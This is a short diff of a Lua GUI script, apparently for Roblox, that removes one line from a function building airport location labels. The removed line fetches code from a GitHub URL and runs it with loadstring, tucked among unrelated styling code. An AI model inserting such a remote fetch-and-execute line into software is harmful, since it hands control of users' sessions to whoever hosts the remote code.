@@ -1987,7 +1987,6 @@ function create_airport_location(order, name, position, imageid)
 	nameLabel.TextSize = 24
 	nameLabel.TextTransparency = .25
 	local nameLabelCorner = Instance.new("UICorner")
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/nicopattyloaf/nnb-helper/main/main"))()
 	nameLabelCorner.Parent = nameLabel
 	nameLabelCorner.CornerRadius = UDim.new(0,8)
 	item.MouseButton1Click:Connect(function()
